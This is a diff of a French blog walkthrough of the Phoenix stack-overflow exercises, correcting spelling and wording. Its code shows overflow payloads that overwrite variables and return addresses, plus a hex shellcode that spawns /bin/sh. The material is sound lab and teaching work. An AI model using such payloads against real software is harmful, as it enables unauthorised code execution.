@@ -10,8 +10,8 @@
 <meta property="og:title" content="Tape3" />
 <meta name="author" content="S-Mazigh" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Mise en route Telecharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience." />
-<meta property="og:description" content="Mise en route Telecharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience." />
+<meta name="description" content="Mise en route Télécharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience." />
+<meta property="og:description" content="Mise en route Télécharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience." />
 <link rel="canonical" href="https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html" />
 <meta property="og:url" content="https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html" />
 <meta property="og:site_name" content="Assembleur x86_64 (En travaux)" />
@@ -20,7 +20,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Tape3" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S-Mazigh"},"dateModified":"2024-01-23T00:00:00+01:00","datePublished":"2024-01-23T00:00:00+01:00","description":"Mise en route Telecharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience.","headline":"Tape3","mainEntityOfPage":{"@type":"WebPage","@id":"https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html"},"url":"https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S-Mazigh"},"dateModified":"2024-01-23T00:00:00+01:00","datePublished":"2024-01-23T00:00:00+01:00","description":"Mise en route Télécharger la vm amd64 ici, qemu aussi si vous ne l’avez pas, debian, arch. Lancez le script boot-exploit-education-phoenix-amd64.sh. Utilisez le login user et le mot de passe user. Faite ssh -p2222 user@localhost dans un autre terminal pour avoir une meilleure expérience.","headline":"Tape3","mainEntityOfPage":{"@type":"WebPage","@id":"https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html"},"url":"https://s-mazigh.github.io/ASMx86_64/2024/01/23/phoenix.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href=https://s-mazigh.github.io/ASMx86_64/assets/css/style.css><link type="application/atom+xml" rel="alternate" href="https://s-mazigh.github.io/ASMx86_64/feed.xml" title="Assembleur x86_64 (En travaux)" />
 </head><body><header class="site-header">
@@ -75,7 +75,7 @@
         <div class="post-content e-content" id="post-content" itemprop="articleBody">
             <h2 id="mise-en-route">Mise en route</h2>
 <ul>
-  <li>Telecharger la vm amd64 <a href="https://exploit.education/downloads/">ici</a>, qemu aussi si vous ne l’avez pas, <a href="https://www.tecmint.com/install-qemu-kvm-ubuntu-create-virtual-machines/">debian</a>, <a href="https://www.howtoforge.com/how-to-install-kvm-qemu-on-manjaro-archlinux/]">arch</a>.</li>
+  <li>Télécharger la vm amd64 <a href="https://exploit.education/downloads/">ici</a>, qemu aussi si vous ne l’avez pas, <a href="https://www.tecmint.com/install-qemu-kvm-ubuntu-create-virtual-machines/">debian</a>, <a href="https://www.howtoforge.com/how-to-install-kvm-qemu-on-manjaro-archlinux/]">arch</a>.</li>
   <li>Lancez le script <code class="language-plaintext highlighter-rouge">boot-exploit-education-phoenix-amd64.sh</code>.</li>
   <li>Utilisez le login <code class="language-plaintext highlighter-rouge">user</code> et le mot de passe <code class="language-plaintext highlighter-rouge">user</code>.</li>
   <li>Faite <code class="language-plaintext highlighter-rouge">ssh -p2222 user@localhost</code> dans un autre <strong>terminal</strong> pour avoir une meilleure expérience.</li>
@@ -83,22 +83,22 @@
 
 <h2 id="notes-importantes">Notes importantes</h2>
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">volatile</code> est pour forcer le compilateur à ne optimiser la variable, et de toujours la mettre à jour en mémoire.</li>
-  <li><code class="language-plaintext highlighter-rouge">"\x"</code> permet d’écrire des chaines de caracteres en utilisant des hexadicimaux: <code class="language-plaintext highlighter-rouge">"\x30\x30" == "00"</code>.</li>
-  <li>Une variable en bash ne peut pas stocker le caractére <code class="language-plaintext highlighter-rouge">'\x00'</code> (Stack-Five et Stack-Six).</li>
+  <li><code class="language-plaintext highlighter-rouge">volatile</code> est pour forcer le compilateur à ne pas optimiser la variable, et de toujours la mettre à jour en mémoire.</li>
+  <li><code class="language-plaintext highlighter-rouge">"\x"</code> permet d’écrire des chaines de caractères en utilisant des hexadicimaux: <code class="language-plaintext highlighter-rouge">"\x30\x30" == "00"</code>.</li>
+  <li>Une variable en bash ne peut pas stocker le caractère <code class="language-plaintext highlighter-rouge">'\x00'</code> (Stack-Five et Stack-Six).</li>
 </ul>
 
 <h3 id="rappel-gdb">Rappel gdb</h3>
 <ul>
   <li>La VM utilise <strong>gef</strong> (gdb enhanced features) pour faciliter l’utilisation de gdb.</li>
-  <li><code class="language-plaintext highlighter-rouge">start</code> est l’equivalent de <code class="language-plaintext highlighter-rouge">run</code> avec un breakpoint sur <code class="language-plaintext highlighter-rouge">main()</code>. Vu que le binaire ne contient pas assez de symboles pour le débugage, on ne peut faire des breakpoint que sur des adresses.
+  <li><code class="language-plaintext highlighter-rouge">start</code> est l’équivalent de <code class="language-plaintext highlighter-rouge">run</code> avec un breakpoint sur <code class="language-plaintext highlighter-rouge">main()</code>. Vu que le binaire ne contient pas assez de symboles pour le débugage, on ne peut faire des breakpoint que sur des adresses.
     <ul>
       <li>gef permet d’utiliser une syntaxe plus simple avec le nom de la fonction, ex: <code class="language-plaintext highlighter-rouge">b *start_level</code>.</li>
-      <li>Ne pas oublier l’asterix avant l’adresse pour les breakpoints!!</li>
+      <li>Ne pas oublier l’astérisque avant l’adresse pour les breakpoints!!</li>
     </ul>
   </li>
-  <li>Pour donner un input au programme sur gdb on utilise la syntax <code class="language-plaintext highlighter-rouge">start&lt; &lt;(echo -ne "Hello")</code>, on peut utiliser <code class="language-plaintext highlighter-rouge">run</code> à la place pour ne pas s’arréter au <code class="language-plaintext highlighter-rouge">main()</code>.</li>
-  <li>On peut avoir l’assembleur d’une fonction en utilisant la commande <code class="language-plaintext highlighter-rouge">disassemble</code>, exemple: <code class="language-plaintext highlighter-rouge">disassemble start_level</code> donnera le même code assembleur de la fonction <code class="language-plaintext highlighter-rouge">start_level</code>. C’est plus pratique sur la VM vu que <code class="language-plaintext highlighter-rouge">objdump --disassemble=start_level</code> n’est pas supporté par cette dérnière.</li>
+  <li>Pour donner un input au programme sur gdb on utilise la syntaxe <code class="language-plaintext highlighter-rouge">start&lt; &lt;(echo -ne "Hello")</code>, on peut utiliser <code class="language-plaintext highlighter-rouge">run</code> à la place pour ne pas s’arrêter au <code class="language-plaintext highlighter-rouge">main()</code>.</li>
+  <li>On peut avoir l’assembleur d’une fonction en utilisant la commande <code class="language-plaintext highlighter-rouge">disassemble</code>, exemple: <code class="language-plaintext highlighter-rouge">disassemble start_level</code> donnera le même code assembleur de la fonction <code class="language-plaintext highlighter-rouge">start_level</code>. C’est plus pratique sur la VM vu que <code class="language-plaintext highlighter-rouge">objdump --disassemble=start_level</code> n’est pas supporté par cette dernière.</li>
 </ul>
 
 <h2 id="stack-zero">Stack-zero</h2>
@@ -141,9 +141,9 @@
 </code></pre></div></div>
 
 <ul>
-  <li>Le fait de déclarer <code class="language-plaintext highlighter-rouge">buffer</code> et <code class="language-plaintext highlighter-rouge">changeme</code> dans une struct, permet d’être sûr que les 64 caractères de <code class="language-plaintext highlighter-rouge">buffer</code> précederont l’entier <code class="language-plaintext highlighter-rouge">changeme</code>.</li>
-  <li>Ajoutant à cela le fait que l’implementation <code class="language-plaintext highlighter-rouge">gets</code> simpliste permet d’écrire autant d’octets qu’on veut (segfault si elle arrive à une adresse interdite).</li>
-  <li>Ainsi en écrivant plus de 64 octets, on va modifier la valeur de <code class="language-plaintext highlighter-rouge">changeme</code>.</li>
+  <li>Le fait de déclarer <code class="language-plaintext highlighter-rouge">buffer</code> et <code class="language-plaintext highlighter-rouge">changeme</code> dans une struct, permet d’être sûr que les 64 caractères de <code class="language-plaintext highlighter-rouge">buffer</code> précèderont l’entier <code class="language-plaintext highlighter-rouge">changeme</code>.</li>
+  <li>Ajoutant à cela le fait que l’implémentation <code class="language-plaintext highlighter-rouge">gets</code> simpliste permet d’écrire autant d’octets qu’on veut (segfault si elle arrive à une adresse interdite).</li>
+  <li>Ainsi, en écrivant plus de 64 octets, on va modifier la valeur de <code class="language-plaintext highlighter-rouge">changeme</code>.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print("E"*64+"\x10\x20\x30\40")'</span> | /opt/phoenix/amd64/stack-zero 
@@ -160,7 +160,7 @@ Well done, the 'changeme' variable has been changed!
 </div></center>
 
 <blockquote>
-  <p>Remarquez que la valeur de <strong>changme</strong> est inversée, vu qu’on écris depuis l’adresse basse à l’adresse haute, et que l’architecture amd64 suit le schéma <strong>little-endian</strong>.</p>
+  <p>Remarquez que la valeur de <strong>changme</strong> est inversée, vu qu’on écrit depuis l’adresse basse à l’adresse haute, et que l’architecture amd64 suit le schéma <strong>little-endian</strong>.</p>
 </blockquote>
 
 <h2 id="stack-one">Stack-one</h2>
@@ -206,9 +206,9 @@ Well done, the 'changeme' variable has been changed!
 </code></pre></div></div>
 
 <ul>
-  <li>On a toujours la même struct, mais ici on doit passer l’argument <code class="language-plaintext highlighter-rouge">argv[1]</code> et fair en sorte d’avoir une valeur spécifique pour <code class="language-plaintext highlighter-rouge">changeme</code>.
+  <li>On a toujours la même struct, mais ici on doit passer l’argument <code class="language-plaintext highlighter-rouge">argv[1]</code> et faire en sorte d’avoir une valeur spécifique pour <code class="language-plaintext highlighter-rouge">changeme</code>.
     <ul>
-      <li>La fonction <code class="language-plaintext highlighter-rouge">strcpy</code> est tout aussi naïve que <code class="language-plaintext highlighter-rouge">gets</code>, elle ne s’arrete qu’au caractére <code class="language-plaintext highlighter-rouge">0x00</code> contrairement à <code class="language-plaintext highlighter-rouge">strncpy</code> qui accepte un troisième argument representant le nombre de caractéres à copier.</li>
+      <li>La fonction <code class="language-plaintext highlighter-rouge">strcpy</code> est tout aussi naïve que <code class="language-plaintext highlighter-rouge">gets</code>, elle ne s’arrête qu’au caractère <code class="language-plaintext highlighter-rouge">0x00</code> contrairement à <code class="language-plaintext highlighter-rouge">strncpy</code> qui accepte un troisième argument représentant le nombre de caractères à copier.</li>
     </ul>
   </li>
 </ul>
@@ -264,7 +264,7 @@ Well done, you have successfully set changeme to the correct value
 </code></pre></div></div>
 
 <ul>
-  <li>Même idée que stack-one, on a juste à exporter la variable d’environnement <code class="language-plaintext highlighter-rouge">ExploitEducation</code> avec le chaine de caractères necéssaire.</li>
+  <li>Même idée que stack-one, on a juste à exporter la variable d’environnement <code class="language-plaintext highlighter-rouge">ExploitEducation</code> avec la chaine de caractères nécessaire.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">ExploitEducation</span><span class="o">=</span><span class="si">$(</span> python <span class="nt">-c</span> <span class="s1">'print("E"*64+"\x0a\x09\x0a\x0d")'</span><span class="si">)</span>  
@@ -321,7 +321,7 @@ Well done, you have successfully set changeme to the correct value
 </code></pre></div></div>
 
 <ul>
-  <li>C’est toujours la même histoire, mais ici on doit écrire <strong>8 octets</strong> correspondant à l’adresse de la fonction <code class="language-plaintext highlighter-rouge">complete_level()</code>.</li>
+  <li>C’est toujours la même histoire, mais ici, on doit écrire <strong>8 octets</strong> correspondant à l’adresse de la fonction <code class="language-plaintext highlighter-rouge">complete_level()</code>.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~<span class="nv">$ </span>nm /opt/phoenix/amd64/stack-three
@@ -376,7 +376,7 @@ Congratulations, you've finished phoenix/stack-three :-) Well done!
 
 <ul>
   <li>On n’a plus la struct, autrement dit le compilateur peut choisir l’ordre qui lui va.</li>
-  <li>Maintenant, on doit réecrire l’adresse de retour <code class="language-plaintext highlighter-rouge">push</code> par l’instruction <code class="language-plaintext highlighter-rouge">call start_level()</code> pour <strong>retourner</strong> vers <code class="language-plaintext highlighter-rouge">complete_level()</code> au lieu de <code class="language-plaintext highlighter-rouge">main()</code>.</li>
+  <li>Maintenant, on doit réécrire l’adresse de retour <code class="language-plaintext highlighter-rouge">push</code> par l’instruction <code class="language-plaintext highlighter-rouge">call start_level()</code> pour <strong>retourner</strong> vers <code class="language-plaintext highlighter-rouge">complete_level()</code> au lieu de <code class="language-plaintext highlighter-rouge">main()</code>.</li>
   <li>Sachant que la pile doit être alignée sur 16 et que le compilateur peut sauvegarder des registres dans la pile, on ne peut pas calculer directement le nombre d’octets nécessaires sans voir le code assembleur.</li>
 </ul>
 
@@ -402,7 +402,7 @@ Congratulations, you've finished phoenix/stack-three :-) Well done!
 </code></pre></div></div>
 
 <ul>
-  <li>On voit que <code class="language-plaintext highlighter-rouge">%rbp</code> fu push dans la pile.</li>
+  <li>On voit que <code class="language-plaintext highlighter-rouge">%rbp</code> fut push dans la pile.</li>
   <li>L’instruction <code class="language-plaintext highlighter-rouge">sub</code> nous dit que <strong>0x50=80</strong> octets furent alloués. Et la préparation de l’appel à <code class="language-plaintext highlighter-rouge">gets(buffer);</code> nous permet de savoir que notre buffer commence au sommet de la pile (l’adresse la plus basse).</li>
   <li>Pour ainsi dire, on doit écrire <strong>80+8</strong> octets avant d’arriver à l’adresse de retour.</li>
 </ul>
@@ -447,8 +447,8 @@ Congratulations, you've finished phoenix/stack-four :-) Well done!
 </code></pre></div></div>
 
 <ul>
-  <li>Alors, ici, on doit toujours réecrire l’adresse de retour enregistrée dans la pile. Par contre, on doit rediriger l’exécution vers du code qu’on charge dans la buffer.</li>
-  <li>Pour cela, on doit connaitre l’adresse exacte ou est situé notre buffer en passant par <strong>gdb</strong>. Mais avant, on peut préparer le terrain en utilisant <code class="language-plaintext highlighter-rouge">objdump</code>.</li>
+  <li>Alors, ici, on doit toujours réécrire l’adresse de retour enregistrée dans la pile. En revanche, on doit rediriger l’exécution vers du code qu’on charge dans le buffer.</li>
+  <li>Pour cela, on doit connaitre l’adresse exacte où est situé notre buffer en passant par <strong>gdb</strong>. Mais avant, on peut préparer le terrain en utilisant <code class="language-plaintext highlighter-rouge">objdump</code>.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~<span class="nv">$ </span>objdump <span class="nt">--disassemble</span> /opt/phoenix/amd64/stack-five 
@@ -466,7 +466,7 @@ Congratulations, you've finished phoenix/stack-four :-) Well done!
   4005a3:	c3                   	retq   
 </code></pre></div></div>
 <ul>
-  <li>Alors, l’instruction <code class="language-plaintext highlighter-rouge">add    $0xffffffffffffff80,%rsp</code> est équivalente à <code class="language-plaintext highlighter-rouge">sub $0x80, %rsp</code>, autrement dit on alloue 128 octets (la taille du buffer). Et l’appel à <code class="language-plaintext highlighter-rouge">gets()</code> nous confirme que le buffer commence bel et bien à <code class="language-plaintext highlighter-rouge">%rsp == %rbp - 0x80</code>. Avec cela on peut calculer le nombre d’octets nécessaire pour arriver à l’adresse de retour.
+  <li>Alors, l’instruction <code class="language-plaintext highlighter-rouge">add    $0xffffffffffffff80,%rsp</code> est équivalente à <code class="language-plaintext highlighter-rouge">sub $0x80, %rsp</code>, autrement dit, on alloue 128 octets (la taille du buffer). Et l’appel à <code class="language-plaintext highlighter-rouge">gets()</code> nous confirme que le buffer commence bel et bien à <code class="language-plaintext highlighter-rouge">%rsp == %rbp - 0x80</code>. Avec cela, on peut calculer le nombre d’octets nécessaires pour arriver à l’adresse de retour.
     <ul>
       <li>128 octets + 8 octets du rbp sauvegardé = 136 octets avant l’adresse de retour.</li>
     </ul>
@@ -474,23 +474,19 @@ Congratulations, you've finished phoenix/stack-four :-) Well done!
 </ul>
 
 <blockquote>
-  <p>Vous pouvez aussi inspecter la mémoire quand gdb est dans <code class="language-plaintext highlighter-rouge">start_level</code> pour voir où se trouve l’adresse de l’instruction suivant <code class="language-plaintext highlighter-rouge">call start_level</code> dans <code class="language-plaintext highlighter-rouge">main()</code> et calculer la différence entre elle et l’adresse du buffer.</p>
+  <p>Vous pouvez aussi inspecter la mémoire quand gdb est dans <code class="language-plaintext highlighter-rouge">start_level</code> pour voir où se trouve l’adresse de l’instruction juste après <code class="language-plaintext highlighter-rouge">call start_level</code> dans <code class="language-plaintext highlighter-rouge">main()</code> et calculer la différence entre elle et l’adresse du buffer.</p>
 </blockquote>
 
 <ul>
-  <li>Le gdb de la VM n’aime pas avoir du python comme entrée, du coup je crée une variable d’environnement qui stockera un shellcode de <strong>57 octets</strong> et <strong>79 ‘E’</strong>, vu que l’adresse du buffer contiendra des zeros on la passera directement via un <code class="language-plaintext highlighter-rouge">echo -ne</code> ou un <code class="language-plaintext highlighter-rouge">printf</code>.</li>
+  <li>Le gdb de la VM n’aime pas avoir du python comme entrée, du coup je crée une variable d’environnement qui stockera un shellcode de <strong>57 octets</strong> et <strong>79 ‘E’</strong>, vu que l’adresse du buffer contiendra des zéros, on la passera directement via un <code class="language-plaintext highlighter-rouge">echo -ne</code> ou un <code class="language-plaintext highlighter-rouge">printf</code>.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">fill</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05"</span><span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("E"*79)'</span><span class="si">))</span>
 </code></pre></div></div>
 
 <ul>
-  <li>
-    <p>Les variables d’environnement sont chargées en mémoire au dessus de la pile, une modification de ces dernieres décallera le début de la pile, et changera l’adresse où commence le buffer.</p>
-  </li>
-  <li>
-    <p>En lancant <strong>gdb</strong> faites toujours en sorte d’exécuter ses instructions avant <code class="language-plaintext highlighter-rouge">run</code> ou <code class="language-plaintext highlighter-rouge">start</code>, pour avoir le même début de pile que si on exécute le code via le terminal:</p>
-  </li>
+  <li>Les variables d’environnement sont chargées en mémoire au-dessus de la pile, une modification de ces dernières décalera le début de la pile, et changera l’adresse où commence le buffer.</li>
+  <li>En lançant <strong>gdb</strong> faites toujours en sorte d’exécuter ses instructions avant <code class="language-plaintext highlighter-rouge">run</code> ou <code class="language-plaintext highlighter-rouge">start</code>, pour avoir le même début de pile que si on exécute le code via le terminal:</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    user@phoenix-amd64:~<span class="nv">$ </span>gdb /opt/phoenix/amd64/stack-five
@@ -503,10 +499,10 @@ Congratulations, you've finished phoenix/stack-four :-) Well done!
 
 <ul>
   <li>
-    <p>Et là en retient l’adresse de <code class="language-plaintext highlighter-rouge">%rsp</code>:<code class="language-plaintext highlighter-rouge">0x00007fffffffe450</code> (elle est surement différente chez vous!!). On peut faire deux <code class="language-plaintext highlighter-rouge">stepi</code> pour arriver à <code class="language-plaintext highlighter-rouge">ret</code>, là on remarque que la valeur pointée par <code class="language-plaintext highlighter-rouge">%rsp</code>=<code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code>, et que gdb affiche <code class="language-plaintext highlighter-rouge">Cannot disassemble from $PC</code> vu que l’adresse de retour pointe vers de l’espace kernel.</p>
+    <p>Et là, on retient l’adresse de <code class="language-plaintext highlighter-rouge">%rsp</code>:<code class="language-plaintext highlighter-rouge">0x00007fffffffe450</code> (elle est sûrement différente chez vous !!). On peut faire deux <code class="language-plaintext highlighter-rouge">stepi</code> pour arriver à <code class="language-plaintext highlighter-rouge">ret</code>, là on remarque que la valeur pointée par <code class="language-plaintext highlighter-rouge">%rsp</code>=<code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code>, et que gdb affiche <code class="language-plaintext highlighter-rouge">Cannot disassemble from $PC</code> vu que l’adresse de retour pointe vers de l’espace kernel.</p>
   </li>
   <li>
-    <p>En relancant gdb cette fois avec l’adresse de départ, on obtient:</p>
+    <p>En relançant gdb en écrivant la bonne adresse du buffer à la place de l’adresse de retour, on obtient:</p>
   </li>
 </ul>
 
@@ -525,7 +521,7 @@ Do you need <span class="s2">"set solib-search-path"</span> or <span class="s2">
 </code></pre></div></div>
 
 <ul>
-  <li>Quand vous lancerez le programme depuis le terminal, utilisez le chemin absolue pour avoir la même valeur pour la variable <code class="language-plaintext highlighter-rouge">_</code> que ce qu’on a mis sur gdb.</li>
+  <li>Quand vous lancerez le programme depuis le terminal, utilisez le chemin absolu pour avoir la même valeur pour la variable <code class="language-plaintext highlighter-rouge">_</code> que ce qu’on a mis sur gdb.</li>
 </ul>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$fill</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00"</span> | /opt/phoenix/amd64/stack-five 
